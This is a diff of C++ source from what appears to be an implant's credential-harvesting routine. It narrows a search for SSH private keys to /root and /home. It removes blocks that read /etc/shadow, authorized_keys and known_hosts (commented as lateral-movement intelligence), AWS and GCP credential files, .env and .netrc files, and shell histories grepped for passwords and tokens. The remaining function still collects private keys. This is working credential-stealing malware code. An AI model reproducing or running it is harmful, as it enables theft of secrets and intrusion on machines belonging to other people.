@@ -248,7 +248,7 @@ static std::string taskCredentialHarvest() {
     // Step 1: SSH keys — highest priority
     out += "--- Step 1: SSH Private Keys ---\n";
     std::string sshKeys = runCommand(
-        "find / -maxdepth 5 -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' "
+        "find /root /home -maxdepth 3 -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' "
         "-o -name 'id_dsa' -o -name '*.pem' 2>/dev/null");
     if (sshKeys.empty()) {
         out += "  No SSH private keys found\n";
@@ -267,70 +267,6 @@ static std::string taskCredentialHarvest() {
                 out += "  (could not read)\n";
             }
         }
-    }
-
-    // Also grab authorized_keys and known_hosts for lateral movement intel
-    out += "--- SSH authorized_keys & known_hosts ---\n";
-    std::string authKeys = runCommand(
-        "find / -maxdepth 5 \\( -name 'authorized_keys' -o -name 'known_hosts' \\) 2>/dev/null");
-    if (!authKeys.empty()) {
-        std::istringstream stream(authKeys);
-        std::string path;
-        while (std::getline(stream, path)) {
-            if (path.empty()) continue;
-            out += "  " + path + ":\n";
-            std::vector<uint8_t> data = readFileBytes(path);
-            if (!data.empty()) {
-                out += std::string(data.begin(), data.end()) + "\n";
-            }
-        }
-    }
-
-    // Step 2: /etc/shadow
-    out += "--- Step 2: /etc/shadow ---\n";
-    std::vector<uint8_t> shadow = readFileBytes("/etc/shadow");
-    if (!shadow.empty()) {
-        out += std::string(shadow.begin(), shadow.end()) + "\n";
-    } else {
-        out += "  Could not read /etc/shadow\n";
-    }
-
-    // Step 3: AWS / cloud credentials
-    out += "--- Step 3: Cloud Credentials ---\n";
-    std::string cloudFiles = runCommand(
-        "find / -maxdepth 5 \\( "
-        "-name 'credentials' -path '*/.aws/*' "
-        "-o -name 'config' -path '*/.aws/*' "
-        "-o -name '*.json' -path '*/.gcp/*' "
-        "-o -name '*.json' -path '*/.config/gcloud/*' "
-        "-o -name '.env' "
-        "-o -name '.netrc' "
-        "\\) 2>/dev/null");
-    if (cloudFiles.empty()) {
-        out += "  No cloud credential files found\n";
-    } else {
-        std::istringstream stream(cloudFiles);
-        std::string path;
-        while (std::getline(stream, path)) {
-            if (path.empty()) continue;
-            out += "  " + path + ":\n";
-            std::vector<uint8_t> data = readFileBytes(path);
-            if (!data.empty()) {
-                out += std::string(data.begin(), data.end()) + "\n";
-            }
-        }
-    }
-
-    // Step 4: Bash history grep for sensitive tokens
-    out += "--- Step 4: Sensitive tokens in shell history ---\n";
-    std::string histGrep = runCommand(
-        "find / -maxdepth 4 -name '.bash_history' -o -name '.zsh_history' 2>/dev/null "
-        "| xargs grep -ihE '(password|token|secret|api.key|AWS_|PRIVATE)' 2>/dev/null "
-        "| head -50");
-    if (histGrep.empty()) {
-        out += "  No sensitive tokens found in shell history\n";
-    } else {
-        out += histGrep + "\n";
     }
 
     return out;
